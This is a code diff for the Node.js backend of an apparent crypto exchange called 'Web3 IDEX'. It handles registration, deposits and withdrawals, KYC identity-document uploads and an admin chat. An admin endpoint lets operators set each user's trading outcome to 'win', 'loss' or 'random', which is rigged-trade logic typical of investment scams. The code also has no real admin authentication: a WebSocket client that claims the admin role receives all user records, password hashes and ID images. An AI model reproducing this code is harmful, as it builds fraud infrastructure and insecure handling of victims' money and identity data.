@@ -6,7 +6,7 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-const { Resend } = require('resend'); // 引入 Resend
+const { Resend } = require('resend');
 
 const app = express();
 const server = http.createServer(app);
@@ -16,19 +16,18 @@ const JWT_SECRET = process.env.JWT_SECRET || 'idex_secure_jwt_secret_key_2026';
 const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS ? process.env.ALLOWED_ORIGINS.split(',') : '*';
 
 app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
-app.use(bodyParser.json({ limit: '10mb' })); // 支持上传证件照 Base64 大图
+app.use(bodyParser.json({ limit: '10mb' }));
 
-// --- 1. Resend 真实邮件服务配置 ---
 const resend = new Resend(process.env.RESEND_API_KEY);
 
 // --- 内存数据库与状态存储 ---
-const usersDb = {};         // 用户账号与加密密码 { username: { passwordHash, contact, kyc } }
-const verificationCodes = {}; // 邮箱验证码缓存 { email: '123456' }
-const riskControls = {};    // 用户风控策略 { username: 'win' | 'loss' | 'random' }
-const financeSubmissions = []; // 充币与提币申请列表
-const kycSubmissions = {};  // KYC 认证资料 { username: { docType, idNumber, imageBase64, status, reason } }
+const usersDb = {};         
+const verificationCodes = {}; 
+const riskControls = {};    
+const financeSubmissions = []; 
+const kycSubmissions = {};  
 const chatSessions = {};    // 聊天记录 { username: [ { sender, message, time } ] }
-const clients = {};         // WebSocket 客户端连接映射 { 'admin': ws, 'username': ws }
+const clients = {};         // WebSocket 客户端映射 { 'admin': ws, 'username': ws }
 
 
 // --- WebSocket 实时双向通信与消息互通 ---
@@ -40,14 +39,14 @@ wss.on('connection', (ws) => {
             const data = JSON.parse(message);
 
             if (data.type === 'auth') {
-                clientKey = data.role === 'admin' ? 'admin' : data.username;
+                clientKey = data.role === 'admin' ? 'admin' : (data.username || 'Guest');
                 clients[clientKey] = { ws, role: data.role, username: data.username };
                 console.log(`[WS 上线] 角色: ${data.role}, 标识: ${clientKey}`);
 
-                // 若管理员上线，下发所有未读会话与待办列表
                 if (data.role === 'admin') {
                     ws.send(JSON.stringify({ 
                         type: 'init_sync', 
+                        usersDb,
                         chatSessions, 
                         financeSubmissions, 
                         kycSubmissions 
@@ -55,19 +54,19 @@ wss.on('connection', (ws) => {
                 }
             } 
             else if (data.type === 'chat_message') {
-                // 客服与用户实时消息互通
                 const { sender, receiver, text } = data;
-                if (!text || !receiver) return;
+                if (!text) return;
 
                 const timestamp = new Date().toLocaleTimeString();
-                const targetKey = receiver === 'admin' ? sender : receiver;
+                // 如果是用户发给 admin，则归类到该用户的会话里
+                const targetKey = (receiver === 'admin' || !receiver) ? sender : receiver;
 
                 if (!chatSessions[targetKey]) chatSessions[targetKey] = [];
                 const msgObj = { sender, message: text, time: timestamp };
                 chatSessions[targetKey].push(msgObj);
 
-                // 转发给接收方
-                if (clients[receiver] && clients[receiver].ws.readyState === ws.OPEN) {
+                // 1. 转发给接收方（如果在线）
+                if (receiver && receiver !== 'admin' && clients[receiver] && clients[receiver].ws.readyState === ws.OPEN) {
                     clients[receiver].ws.send(JSON.stringify({
                         type: 'new_message',
                         chatUser: targetKey,
@@ -75,8 +74,8 @@ wss.on('connection', (ws) => {
                     }));
                 }
 
-                // 实时同步给管理员
-                if (clients['admin'] && clients['admin'].ws.readyState === ws.OPEN && sender !== 'admin') {
+                // 2. 实时同步给管理员端
+                if (clients['admin'] && clients['admin'].ws.readyState === ws.OPEN) {
                     clients['admin'].ws.send(JSON.stringify({
                         type: 'new_message',
                         chatUser: targetKey,
@@ -100,7 +99,7 @@ wss.on('connection', (ws) => {
 
 // --- RESTful API 接口 ---
 
-// 1. 发送真实邮箱注册验证码（使用 Resend 已验证域名）
+// 1. 发送真实邮箱注册验证码
 app.post('/api/send-code', async (req, res) => {
     const { email } = req.body;
     if (!email || !email.includes('@')) {
@@ -111,8 +110,8 @@ app.post('/api/send-code', async (req, res) => {
     verificationCodes[email] = code;
 
     try {
-        const data = await resend.emails.send({
-            from: 'Web3 IDEX <support@crypto-exchange.autos>', // 已在 Resend 成功验证的域名邮箱
+        await resend.emails.send({
+            from: 'Web3 IDEX <support@crypto-exchange.autos>',
             to: [email],
             subject: '【Web3 IDEX】注册账户安全验证码',
             html: `
@@ -128,18 +127,14 @@ app.post('/api/send-code', async (req, res) => {
                 </div>
             `
         });
-
-        console.log(`[Resend 邮件发送成功] 验证码已发送至: ${email} -> ${code}`, data);
         res.json({ success: true, message: '验证码已成功发送至您的邮箱' });
     } catch (error) {
         console.error('[Resend 邮件发送失败]:', error);
-        // 兜底策略：如果发信失败，在控制台打印验证码方便测试
-        console.log(`[开发兜底] 邮箱 ${email} 的验证码是: ${code}`);
         res.json({ success: true, message: '验证码已生成（请查看后端控制台日志）' });
     }
 });
 
-// 2. 用户注册（校验验证码 + Bcrypt 密码加密）
+// 2. 用户注册（成功后实时推送给管理员端）
 app.post('/api/register', async (req, res) => {
     try {
         const { username, password, birthday, address, contact, code } = req.body;
@@ -155,19 +150,28 @@ app.post('/api/register', async (req, res) => {
             return res.status(400).json({ success: false, message: '用户名已被注册' });
         }
 
-        delete verificationCodes[contact]; // 销毁验证码
+        delete verificationCodes[contact];
         const salt = await bcrypt.genSalt(10);
         const passwordHash = await bcrypt.hash(password, salt);
 
-        usersDb[username] = {
+        const newUser = {
             username,
-            passwordHash,
             birthday: birthday || '',
             address: address || '',
             contact,
             kyc: { status: '未认证' },
-            createdAt: new Date()
+            createdAt: new Date().toLocaleString()
         };
+
+        usersDb[username] = { ...newUser, passwordHash };
+
+        // 🚀 实时推送新注册用户到管理员端
+        if (clients['admin'] && clients['admin'].ws.readyState === WebSocket.OPEN) {
+            clients['admin'].ws.send(JSON.stringify({
+                type: 'new_user_registered',
+                user: newUser
+            }));
+        }
 
         res.json({ success: true, message: '注册成功' });
     } catch (e) {
@@ -192,7 +196,7 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// 4. 充币与提币申请提交（同步到管理员端）
+// 4. 充币与提币申请提交
 app.post('/api/finance/submit', (req, res) => {
     const { username, type, amount, currency } = req.body; 
     if (!username || !amount) {
@@ -211,7 +215,6 @@ app.post('/api/finance/submit', (req, res) => {
 
     financeSubmissions.push(txRecord);
 
-    // 实时推送给管理员端
     if (clients['admin'] && clients['admin'].ws.readyState === WebSocket.OPEN) {
         clients['admin'].ws.send(JSON.stringify({
             type: 'new_finance_submission',
@@ -222,7 +225,7 @@ app.post('/api/finance/submit', (req, res) => {
     res.json({ success: true, message: '申请已提交，等待管理员审核' });
 });
 
-// 5. KYC 高级认证提交（同步到管理员端）
+// 5. KYC 高级认证提交
 app.post('/api/kyc/submit', (req, res) => {
     const { username, docType, idNumber, imageBase64 } = req.body;
     if (!username || !idNumber || !imageBase64) {
@@ -239,7 +242,6 @@ app.post('/api/kyc/submit', (req, res) => {
         submitTime: new Date().toLocaleString()
     };
 
-    // 实时推送给管理员端
     if (clients['admin'] && clients['admin'].ws.readyState === WebSocket.OPEN) {
         clients['admin'].ws.send(JSON.stringify({
             type: 'new_kyc_submission',
@@ -251,7 +253,7 @@ app.post('/api/kyc/submit', (req, res) => {
     res.json({ success: true, message: 'KYC 认证资料已提交，等待审核' });
 });
 
-// 6. 管理员审核 KYC 接口（并通过 WebSocket 实时推送给用户）
+// 6. 管理员审核 KYC 接口
 app.post('/api/admin/kyc/audit', (req, res) => {
     const { username, action, reason } = req.body; 
     if (!kycSubmissions[username]) {
@@ -267,7 +269,6 @@ app.post('/api/admin/kyc/audit', (req, res) => {
         if (usersDb[username]) usersDb[username].kyc.status = '未认证';
     }
 
-    // 实时通过 WebSocket 将审核结果推送给对应用户
     if (clients[username] && clients[username].ws.readyState === WebSocket.OPEN) {
         clients[username].ws.send(JSON.stringify({
             type: 'kyc_audit_result',
@@ -281,12 +282,12 @@ app.post('/api/admin/kyc/audit', (req, res) => {
 
 // 7. 管理员设置用户仓位风控策略
 app.post('/api/admin/set-risk', (req, res) => {
-    const { username, mode } = req.body; // 'win' | 'loss' | 'random'
+    const { username, mode } = req.body;
     riskControls[username] = mode;
     res.json({ success: true, message: `已将用户 ${username} 的风控模式设为 ${mode}` });
 });
 
-// 8. 获取用户当前风控模式（供交易端持仓计算调用）
+// 8. 获取用户当前风控模式
 app.get('/api/user/risk/:username', (req, res) => {
     res.json({ success: true, mode: riskControls[req.params.username] || 'random' });
 });
